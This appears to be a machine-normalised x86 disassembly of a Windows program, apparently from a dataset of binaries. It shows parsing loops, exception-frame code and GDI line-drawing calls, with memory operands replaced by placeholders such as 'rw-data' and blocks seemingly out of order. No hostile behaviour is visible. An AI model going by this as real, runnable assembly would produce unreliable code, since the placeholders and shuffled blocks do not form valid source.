jne r-xdata
jmp r-xdata
mov ecx [ esp + 0x30 ]
mov edx [ rw-data ]
push ecx
push eax
push edx
push edi
mov ecx rw-data
call sub_401150
test eax eax
je r-xdata
lea eax [ esp + 0x20 ]
cmp [ esp + 0x34 ] ebx
jb r-xdata
push 0xffffffff
push edi
lea eax [ esp + 0x24 ]
push eax
mov ecx rw-data
call sub_401dd0
mov eax r--data
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
xor eax eax
mov ecx [ esp + 0x20 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x24 ]
call sub_401cc0
mov eax [ rw-data ]
cmp eax edi
je r-xdata
mov eax [ rw-data ]
cmp eax edi
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
je r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ rw-data ]
cmp eax edi
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
je r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ rw-data ]
cmp eax edi
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
je r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
lea ecx [ esp + 0x70 ]
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
mov [ rw-data ] edi
call sub_44fb50
lea ecx [ esp + 0x1c ]
push ecx
lea ecx [ esp + 0x74 ]
mov [ esp + 0x100a4 ] 0x1
call sub_450170
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ rw-data ]
push ecx
push rw-data
push edx
push eax
call sub_402270
mov eax [ rw-data ]
push eax
call j_sub_4b66ed#2
add esp 0x14
cmp [ rw-data ] 0x2
jne r-xdata
lea ecx [ esp + 0x70 ]
call sub_450270
cmp eax 0x1b
jne r-xdata
mov ecx rw-data
call sub_401f20
lea ecx [ esp + 0x70 ]
mov [ esp + 0x100a0 ] 0x0
call sub_44f5f0
cmp [ esp + 0x34 ] ebx
jb r-xdata
xor esi esi
mov [ esp + 0x10 ] edi
mov bl 0x4
xor ebp ebp
lea ecx [ esp + 0x70 ]
mov [ esp + 0x100a0 ] 0x0
call sub_44f5f0
mov ebx 0x10
xor ebx ebx
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ esp + 0x20 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov edx [ esp + 0x74 ]
lea ecx [ esp + 0x70 ]
mov [ esp + 0x14 ] edx
call sub_450380
xor edi edi
lea ecx [ esp + 0x70 ]
mov [ esp + 0x10 ] edi
call sub_450380
cmp eax 0x3
jne r-xdata
mov ecx [ esp + 0x10098 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x10094
retn
lea edx [ esp + 0x10 ]
push edx
mov ecx rw-data
call sub_46bd80
mov eax [ rw-data ]
xor ebp ebp
cmp eax ebp
jne r-xdata
inc edx
cmp esi edx
jge r-xdata
lea ecx [ esp + 0x70 ]
call sub_450380
mov esi eax
cmp esi 0x3
jne r-xdata
lea ecx [ esp + 0x70 ]
call sub_44fb20
mov edi eax
imul edi edi 0xea60
lea ecx [ esp + 0x70 ]
mov [ esp + 0x10 ] edi
call sub_450380
cmp eax 0x9
jne r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
cmp esi 0x9
jne r-xdata
lea ecx [ esp + 0x70 ]
call sub_44fb20
imul eax eax 0x3e8
add edi eax
lea ecx [ esp + 0x70 ]
mov [ esp + 0x10 ] edi
call sub_450380
mov esi eax
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
lea ecx [ esp + 0x14 ]
push ecx
mov ecx rw-data
call sub_41d190
mov esi [ esp + 0x14 ]
jmp r-xdata
cmp esi edx
jne r-xdata
lea edx [ esp + 0x10 ]
push edx
mov ecx rw-data
call sub_46bd80
cmp esi 0xd
jne r-xdata
lea ecx [ esp + 0x70 ]
call sub_450380
mov esi eax
cmp esi 0x3
jne r-xdata
push esi
push ebp
push ebp
push eax
call sub_406880
lea edx [ eax + eax * 4 ]
mov eax [ esp + 0x20 ]
lea ecx [ eax + edx * 2 ]
add esp 0x10
lea eax [ esp + 0x14 ]
mov [ esp + 0x10 ] ecx
lea edx [ esi + 0x1 ]
push eax
mov ecx rw-data
mov [ esp + 0x18 ] edx
call sub_41d190
mov eax rw-data
mov edi 0xf
mov eax r--data
mov [ esp + 0x50 ] edi
mov [ esp + 0x4c ] ebp
mov [ esp + 0x3c ] 0x0
lea edx [ eax + 0x1 ]
nop
cmp esi 0x1c
jne r-xdata
lea ecx [ esp + 0x70 ]
call sub_450380
cmp eax 0x3
jne r-xdata
lea ecx [ esp + 0x70 ]
call sub_44fb20
lea eax [ eax + eax * 4 ]
lea ecx [ edi + eax * 2 ]
mov [ esp + 0x10 ] ecx
lea ecx [ esp + 0x70 ]
call sub_450380
mov esi eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x40 ]
call sub_401e80
lea ecx [ esp + 0x38 ]
push ecx
mov ecx rw-data
mov [ esp + 0x100a4 ] bl
call sub_407460
cmp [ esp + 0x50 ] 0x10
mov [ esp + 0x100a0 ] 0x1
jb r-xdata
xor ebx ebx
mov ebp 0xf
mov [ esp + 0x50 ] ebp
mov [ esp + 0x4c ] ebx
mov [ esp + 0x3c ] bl
mov [ esp + 0x100a0 ] 0x2
mov esi 0x10
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov [ esp + 0x50 ] edi
mov [ esp + 0x4c ] ebp
mov [ esp + 0x3c ] 0x0
inc esi
jmp r-xdata
mov edx [ esp + 0x3c ]
push edx
call j_sub_4b66ed#2
add esp 0x4
lea ecx [ esp + 0x70 ]
call sub_450270
mov edx [ esp + 0x14 ]
cmp [ esp + 0x74 ] edx
jg r-xdata
mov esi [ rw-data ]
sub esi eax
sar esi 0x2
xor esi esi
jmp r-xdata
mov eax [ rw-data ]
cmp eax ebp
mov [ esp + 0x14 ] esi
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov ecx [ rw-data ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add edx eax
mov edi edx
xor edi edi
jmp r-xdata
lea eax [ esp + 0x54 ]
push eax
lea ecx [ esp + 0x74 ]
call sub_4503b0
push 0xffffffff
push ebx
push eax
lea ecx [ esp + 0x44 ]
mov [ esp + 0x100ac ] 0x3
call sub_4018c0
cmp [ esp + 0x6c ] esi
mov [ esp + 0x100a0 ] 0x2
jb r-xdata
mov edx [ rw-data ]
test edx edx
jne r-xdata
push 0x0
push eax
mov ecx rw-data
call sub_41d110
mov ecx esi
jmp r-xdata
mov ecx [ rw-data ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov eax [ rw-data ]
cmp eax ebx
jne r-xdata
lea ecx [ esp + 0x70 ]
mov [ esp + 0x6c ] ebp
mov [ esp + 0x68 ] ebx
mov [ esp + 0x58 ] 0x0
call sub_450380
test eax eax
jne r-xdata
mov ecx [ esp + 0x58 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov eax [ rw-data ]
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ rw-data ]
sub ecx ebp
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
sub esp 0x1c
mov eax esp
mov [ esp + 0x30 ] esp
push ecx
mov [ eax + 0x18 ] ebp
mov [ eax + 0x14 ] ebx
mov ecx rw-data
mov [ eax + 0x4 ] 0x0
call sub_421e10
mov esi edi
imul edi edi 0x1c
mov edx [ rw-data ]
lea esi [ edx + ecx * 4 ]
lea ecx [ esp + 0x70 ]
call sub_44fb20
lea ecx [ esp + 0x70 ]
mov [ esi ] eax
call sub_450380
mov esi eax
cmp esi 0xd
jne r-xdata
mov eax [ rw-data ]
mov [ eax + ecx * 4 ] 0xffffffff
inc ecx
jmp r-xdata
dec eax
cmp ecx eax
jae r-xdata
imul esi esi 0x1c
push 0xffffffff
push ebx
lea edx [ esp + 0x40 ]
add esi ebp
mov ecx esi
push edx
call sub_401dd0
cmp [ esp + 0x50 ] 0x10
mov [ esp + 0x100a0 ] 0x1
jb r-xdata
mov eax r--data
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
dec edx
cmp esi edx
jae r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x70 ]
mov [ esp + 0x50 ] 0xf
mov [ esp + 0x4c ] ebx
mov [ esp + 0x3c ] 0x0
call sub_450270
cmp eax 0x1b
je r-xdata
mov eax [ esp + 0x3c ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ edi + ebp ]
call sub_401e80
inc esi
add edi 0x1c
jmp r-xdata
mov edi [ rw-data ]
sub edi eax
sar edi 0x3
xor edi edi
jmp r-xdata
mov ebp [ rw-data ]
cmp ebp ebx
jne r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push ecx
push edx
push eax
mov ecx rw-data
call sub_46aaf0
or edx 0xffffffff
or ebp 0xffffffff
nop
lea ecx [ esp + 0x70 ]
call sub_450380
cmp eax 0x3
jne r-xdata
mov [ ecx + edi * 8 ] edx
mov eax [ rw-data ]
mov [ eax + edi * 8 + 0x4 ] ebp
inc edi
jmp r-xdata
dec eax
cmp edi eax
jae r-xdata
lea ecx [ esp + 0x70 ]
call sub_44fb20
lea ecx [ esp + 0x70 ]
mov ebx eax
call sub_450380
mov esi eax
cmp esi 0xd
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + edi * 8 ]
mov [ eax ] ebx
mov [ eax + 0x4 ] ebp
lea ecx [ esp + 0x70 ]
call sub_450380
cmp eax 0x3
jne r-xdata
lea ecx [ esp + 0x70 ]
call sub_44fb20
lea ecx [ esp + 0x70 ]
mov ebp eax
call sub_450380
mov esi eax
sub_481c40
mov eax [ rw-data ]
sub esp 0x3c
test eax eax
je r-xdata
mov ecx [ rw-data ]
inc ecx
and ecx 0x7
mov [ rw-data ] ecx
mov eax [ rw-data ]
test eax eax
je r-xdata
add esp 0x3c
retn 0x10
mov ecx [ rw-data ]
push ebx
push ebp
push esi
push edi
lea eax [ esp + 0x3c ]
push eax
push ecx
call [ GetClientRect@IAT ]
mov eax [ esp + 0x44 ]
mov edx [ esp + 0x3c ]
mov ebp [ esp + 0x48 ]
mov ecx [ esp + 0x40 ]
sub eax edx
mov [ esp + 0x18 ] eax
mov eax [ rw-data ]
sub ebp ecx
cmp eax 0x2
mov [ esp + 0x14 ] ebp
jne r-xdata
mov edi [ rw-data ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x38 ]
push ecx
push 0x0
push edx
push edi
mov [ esp + 0x48 ] esi
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x50 ] ebx
mov [ esp + 0x54 ] ebp
call sub_478af0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x6c ]
push eax
push edi
mov [ esp + 0x7c ] esi
call sub_45cef0
mov ecx [ esp + 0x50 ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea edx [ esp + 0x88 ]
push edx
push edi
mov [ esp + 0x90 ] ebx
mov [ esp + 0x98 ] ecx
call sub_45cef0
add esp 0x54
jmp r-xdata
test eax eax
jne r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov esi [ GetStockObject@IAT ]
push 0x6
call esi
mov ebx eax
push 0x7
mov [ esp + 0x30 ] ebx
call esi
push ebx
push edi
mov [ esp + 0x38 ] eax
call [ SelectObject@IAT ]
mov [ esp + 0x18 ] eax
mov eax [ rw-data ]
mov edx 0x7
sub edx eax
xor ebp ebp
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] edx
mov [ esp + 0x10 ] ebp
xor ebx ebx
xor esi esi
mov eax [ rw-data ]
push edi
push eax
call [ ReleaseDC@IAT ]
pop edi
pop esi
pop ebp
pop ebx
cmp [ rw-data ] 0x1
jne r-xdata
mov edi [ rw-data ]
jmp r-xdata
add ebp 0x4
cmp ebp 0x8
mov [ esp + 0x10 ] ebp
jl r-xdata
mov ebp eax
mov eax [ esp + esi * 4 + 0x1c ]
mov ecx [ rw-data ]
push ebx
mov [ esp + 0x30 ] eax
push ebx
inc eax
push ebx
mov [ esp + 0x40 ] eax
lea eax [ esp + 0x38 ]
push eax
push ebx
push ecx
push edi
mov [ esp + 0x4c ] ebx
mov [ esp + 0x54 ] ebp
call sub_478af0
add esp 0x1c
inc esi
cmp esi 0x2
jl r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
mov edx [ rw-data ]
sub edx [ rw-data ]
mov [ esp + 0x10 ] edx
fild [ esp + 0x10 ]
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ rw-data ]
mov esi eax
add esi edi
mov [ esp + 0x20 ] esi
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov ebx eax
mov eax [ rw-data ]
add esp 0x4
add ebx edi
push eax
mov [ esp + 0x24 ] ebx
call [ GetDC@IAT ]
mov edi eax
mov al [ rw-data ]
test al al
je r-xdata
mov ebx [ esp + ebp + 0x1c ]
push 0x0
push 0x0
push ebx
push edi
call [ MoveToEx@IAT ]
mov eax [ esp + ebp + 0x24 ]
mov ecx [ esp + 0x14 ]
mov esi eax
and esi 0x3
neg esi
cmp esi ecx
jge r-xdata
mov edx [ esp + 0x18 ]
push edx
push edi
call [ SelectObject@IAT ]
mov eax ebp
cdq
and edx 0x3
add eax edx
sar eax 0x2
and eax 0x1
mov eax [ esp + eax * 4 + 0x2c ]
push eax
push edi
call [ SelectObject@IAT ]
add esi 0x4
push esi
push ebx
push edi
call [ LineTo@IAT ]
mov eax [ esp + 0x14 ]
add ebp 0x4
cmp esi eax
jl r-xdata
mov ecx [ esp + 0x10 ]
mov [ esp + ecx + 0x24 ] ebp
mov ebp ecx
sub_481ef0
push ecx
mov al [ esp + 0x3 ]
push esi
mov esi ecx
mov [ esi ] al
call sub_460370
mov [ esi + 0x4 ] eax
mov [ eax + 0x89 ] 0x1
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov [ esi + 0x8 ] 0x0
mov eax esi
pop esi
pop ecx
retn
sub_481f30
push 0xffffffff
push sub_4c1280
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x990
push ebx
push ebp
push esi
push edi
xor edi edi
mov [ esp + 0x34 ] edi
mov [ esp + 0x38 ] edi
mov [ esp + 0x3c ] edi
mov esi [ esp + 0x9b0 ]
mov eax [ esi + 0x4 ]
cmp eax edi
mov [ esp + 0x9a8 ] edi
jne r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
cmp esi rw-data
jne r-xdata
movzx ecx [ eax + lookup_table_483358 ]
jmp [ ecx * 4 + jump_table_483330 ]
push edi
push edx
lea ecx [ esp + 0x38 ]
call sub_41d110
mov eax [ esp + 0x9b4 ]
mov ebp [ esp + 0x34 ]
dec eax
cmp eax 0x12
ja r-xdata
test ebp ebp
je r-xdata
mov ecx [ rw-data ]
xor edi edi
cmp ecx edi
je r-xdata
lea ecx [ esp + 0x20 ]
call sub_481ef0
xor ebx ebx
mov [ esp + 0x9a8 ] 0x1
mov [ esp + 0x10 ] ebx
lea ecx [ esp + 0x20 ]
call sub_481ef0
xor ebx ebx
mov [ esp + 0x9a8 ] 0x4
mov [ esp + 0x10 ] ebx
lea esp [ esp ]
lea ecx [ esp + 0x20 ]
call sub_481ef0
xor ebx ebx
mov [ esp + 0x9a8 ] 0x7
mov [ esp + 0x10 ] ebx
lea esp [ esp ]
lea ecx [ esp + 0x20 ]
call sub_481ef0
xor ebx ebx
mov [ esp + 0x9a8 ] 0xa
mov [ esp + 0x10 ] ebx
lea esp [ esp ]
lea ecx [ esp + 0x20 ]
call sub_481ef0
xor ebx ebx
mov [ esp + 0x9a8 ] 0xd
mov [ esp + 0x10 ] ebx
lea esp [ esp ]
lea ecx [ esp + 0x20 ]
call sub_481ef0
xor ebx ebx
mov [ esp + 0x9a8 ] 0x10
mov [ esp + 0x10 ] ebx
lea esp [ esp ]
lea ecx [ esp + 0x20 ]
call sub_481ef0
xor ebx ebx
mov [ esp + 0x9a8 ] 0x13
mov [ esp + 0x10 ] ebx
lea esp [ esp ]
lea ecx [ esp + 0x20 ]
call sub_481ef0
xor ebx ebx
mov [ esp + 0x9a8 ] 0x16
mov [ esp + 0x10 ] ebx
lea esp [ esp ]
lea ecx [ esp + 0x20 ]
call sub_481ef0
xor ebx ebx
mov [ esp + 0x9a8 ] 0x19
mov [ esp + 0x10 ] ebx
lea esp [ esp ]
lea ecx [ esp + 0x20 ]
call sub_481ef0
xor ebx ebx
mov [ esp + 0x9a8 ] 0x1c
mov [ esp + 0x10 ] ebx
lea esp [ esp ]
mov ecx [ esp + 0x9a0 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x99c
retn
push ebp
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ rw-data ]
xor esi esi
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
cmp eax edi
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov [ esp + 0x24 ] edi
mov [ esp + 0x28 ] edi
mov [ esp + 0x2c ] edi
push rw-data
lea ecx [ esp + 0x24 ]
mov [ esp + 0x9ac ] 0x1f
call sub_46a4b0
mov ebx [ esp + 0x24 ]
mov esi ebp
sub ebx ebp
mov eax [ esp + 0x9b4 ]
xor edi edi
cmp eax 0x1
mov eax [ esp + 0x24 ]
jne r-xdata
mov ecx [ esp + 0x10 ]
lea eax [ edi + ecx ]
push eax
lea ecx [ esp + 0x29c ]
call sub_402400
mov [ esp + 0x308 ] ebx
lea edx [ esp + 0x298 ]
push edx
lea ecx [ esp + 0x4f4 ]
mov [ esp + 0x9ac ] 0x2
call sub_402400
mov eax [ esp + 0x308 ]
mov [ esp + 0x560 ] eax
lea ecx [ esp + 0x4f0 ]
push ecx
lea edx [ esp + 0x1c ]
push edx
lea ecx [ esp + 0x28 ]
mov [ esp + 0x9b0 ] 0x3
call sub_46be90
lea ecx [ esp + 0x4f0 ]
call sub_401a90
lea ecx [ esp + 0x298 ]
mov [ esp + 0x9a8 ] 0x1
call sub_401a90
mov eax [ esp + 0x10 ]
inc ebx
add eax 0x70
mov [ esp + 0x10 ] eax
jmp r-xdata
cmp ebx edx
jge r-xdata
mov eax [ esp + 0x9b4 ]
xor edi edi
cmp eax 0x3
mov eax [ esp + 0x24 ]
jne r-xdata
mov edx [ esp + 0x10 ]
lea eax [ edi + edx ]
push eax
lea ecx [ esp + 0x134 ]
call sub_402400
mov [ esp + 0x1a0 ] ebx
lea eax [ esp + 0x130 ]
push eax
lea ecx [ esp + 0x5e4 ]
mov [ esp + 0x9ac ] 0x5
call sub_402400
mov ecx [ esp + 0x1a0 ]
mov [ esp + 0x650 ] ecx
lea edx [ esp + 0x5e0 ]
push edx
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x9b0 ] 0x6
call sub_46bf00
lea ecx [ esp + 0x5e0 ]
call sub_401a90
lea ecx [ esp + 0x130 ]
mov [ esp + 0x9a8 ] 0x4
call sub_401a90
mov eax [ esp + 0x10 ]
inc ebx
add eax 0x70
mov [ esp + 0x10 ] eax
jmp r-xdata
cmp ebx edx
jge r-xdata
mov eax [ esp + 0x9b4 ]
xor edi edi
cmp eax 0x5
mov eax [ esp + 0x24 ]
jne r-xdata
mov edx [ esp + 0x10 ]
lea eax [ edi + edx ]
push eax
lea ecx [ esp + 0x314 ]
call sub_402400
mov [ esp + 0x380 ] ebx
lea eax [ esp + 0x310 ]
push eax
lea ecx [ esp + 0x7c4 ]
mov [ esp + 0x9ac ] 0x8
call sub_402400
mov ecx [ esp + 0x380 ]
mov [ esp + 0x830 ] ecx
lea edx [ esp + 0x7c0 ]
push edx
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x9b0 ] 0x9
call sub_46bf70
lea ecx [ esp + 0x7c0 ]
call sub_401a90
lea ecx [ esp + 0x310 ]
mov [ esp + 0x9a8 ] 0x7
call sub_401a90
mov eax [ esp + 0x10 ]
inc ebx
add eax 0x70
mov [ esp + 0x10 ] eax
jmp r-xdata
cmp ebx edx
jge r-xdata
mov eax [ esp + 0x9b4 ]
xor edi edi
cmp eax 0x7
mov eax [ esp + 0x24 ]
jne r-xdata
mov edx [ esp + 0x10 ]
lea eax [ edi + edx ]
push eax
lea ecx [ esp + 0x224 ]
call sub_402400
mov [ esp + 0x290 ] ebx
lea eax [ esp + 0x220 ]
push eax
lea ecx [ esp + 0x6d4 ]
mov [ esp + 0x9ac ] 0xb
call sub_402400
mov ecx [ esp + 0x290 ]
mov [ esp + 0x740 ] ecx
lea edx [ esp + 0x6d0 ]
push edx
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x9b0 ] 0xc
call sub_46bfe0
lea ecx [ esp + 0x6d0 ]
call sub_401a90
lea ecx [ esp + 0x220 ]
mov [ esp + 0x9a8 ] 0xa
call sub_401a90
mov eax [ esp + 0x10 ]
inc ebx
add eax 0x70
mov [ esp + 0x10 ] eax
jmp r-xdata
cmp ebx edx
jge r-xdata
mov eax [ esp + 0x9b4 ]
xor edi edi
cmp eax 0x9
mov eax [ esp + 0x24 ]
jne r-xdata
mov edx [ esp + 0x10 ]
lea eax [ edi + edx ]
push eax
lea ecx [ esp + 0x404 ]
call sub_402400
mov [ esp + 0x470 ] ebx
lea eax [ esp + 0x400 ]
push eax
lea ecx [ esp + 0x8b4 ]
mov [ esp + 0x9ac ] 0xe
call sub_402400
mov ecx [ esp + 0x470 ]
mov [ esp + 0x920 ] ecx
lea edx [ esp + 0x8b0 ]
push edx
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x9b0 ] 0xf
call sub_46c050
lea ecx [ esp + 0x8b0 ]
call sub_401a90
lea ecx [ esp + 0x400 ]
mov [ esp + 0x9a8 ] 0xd
call sub_401a90
mov eax [ esp + 0x10 ]
inc ebx
add eax 0x70
mov [ esp + 0x10 ] eax
jmp r-xdata
cmp ebx edx
jge r-xdata
mov eax [ esp + 0x9b4 ]
xor ebx ebx
cmp eax 0xb
mov eax [ esp + 0x24 ]
mov [ esp + 0x18 ] ebx
jne r-xdata
mov edx [ esp + 0x10 ]
lea eax [ edi + edx ]
push eax
lea ecx [ esp + 0xbc ]
call sub_402400
mov [ esp + 0x128 ] ebx
lea eax [ esp + 0xb8 ]
push eax
lea ecx [ esp + 0x56c ]
mov [ esp + 0x9ac ] 0x11
call sub_402400
mov ecx [ esp + 0x128 ]
mov [ esp + 0x5d8 ] ecx
lea edx [ esp + 0x568 ]
push edx
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x9b0 ] 0x12
call sub_46c0c0
lea ecx [ esp + 0x568 ]
call sub_401a90
lea ecx [ esp + 0xb8 ]
mov [ esp + 0x9a8 ] 0x10
call sub_401a90
mov eax [ esp + 0x10 ]
inc ebx
add eax 0x70
mov [ esp + 0x10 ] eax
jmp r-xdata
cmp ebx edx
jge r-xdata
mov eax [ esp + 0x9b4 ]
xor edi edi
cmp eax 0xc
mov eax [ esp + 0x24 ]
jne r-xdata
mov ecx [ esp + 0x10 ]
lea eax [ edi + ecx ]
push eax
lea ecx [ esp + 0x1ac ]
call sub_402400
mov [ esp + 0x218 ] ebx
lea edx [ esp + 0x1a8 ]
push edx
lea ecx [ esp + 0x65c ]
mov [ esp + 0x9ac ] 0x14
call sub_402400
mov eax [ esp + 0x218 ]
mov [ esp + 0x6c8 ] eax
lea ecx [ esp + 0x658 ]
push ecx
lea edx [ esp + 0x1c ]
push edx
lea ecx [ esp + 0x28 ]
mov [ esp + 0x9b0 ] 0x15
call sub_46c130
lea ecx [ esp + 0x658 ]
call sub_401a90
lea ecx [ esp + 0x1a8 ]
mov [ esp + 0x9a8 ] 0x13
call sub_401a90
mov eax [ esp + 0x10 ]
inc ebx
add eax 0x70
mov [ esp + 0x10 ] eax
jmp r-xdata
cmp ebx edx
jge r-xdata
mov eax [ esp + 0x9b4 ]
xor edi edi
cmp eax 0xe
mov eax [ esp + 0x24 ]
jne r-xdata
mov edx [ esp + 0x10 ]
lea eax [ edx + edi ]
push eax
lea ecx [ esp + 0x44 ]
call sub_402400
mov [ esp + 0xb0 ] ebx
lea eax [ esp + 0x40 ]
push eax
lea ecx [ esp + 0x74c ]
mov [ esp + 0x9ac ] 0x17
call sub_402400
mov ecx [ esp + 0xb0 ]
mov [ esp + 0x7b8 ] ecx
lea edx [ esp + 0x748 ]
push edx
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x9b0 ] 0x18
call sub_46c1f0
lea ecx [ esp + 0x748 ]
call sub_401a90
lea ecx [ esp + 0x40 ]
mov [ esp + 0x9a8 ] 0x16
call sub_401a90
mov eax [ esp + 0x10 ]
inc ebx
add eax 0x70
mov [ esp + 0x10 ] eax
jmp r-xdata
cmp ebx edx
jge r-xdata
mov eax [ esp + 0x9b4 ]
xor edi edi
cmp eax 0x10
mov eax [ esp + 0x24 ]
jne r-xdata
mov edx [ esp + 0x10 ]
lea eax [ edx + edi ]
push eax
lea ecx [ esp + 0x38c ]
call sub_402400
mov [ esp + 0x3f8 ] ebx
lea eax [ esp + 0x388 ]
push eax
lea ecx [ esp + 0x83c ]
mov [ esp + 0x9ac ] 0x1a
call sub_402400
mov ecx [ esp + 0x3f8 ]
mov [ esp + 0x8a8 ] ecx
lea edx [ esp + 0x838 ]
push edx
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x9b0 ] 0x1b
call sub_46c2d0
lea ecx [ esp + 0x838 ]
call sub_401a90
lea ecx [ esp + 0x388 ]
mov [ esp + 0x9a8 ] 0x19
call sub_401a90
mov eax [ esp + 0x10 ]
inc ebx
add eax 0x70
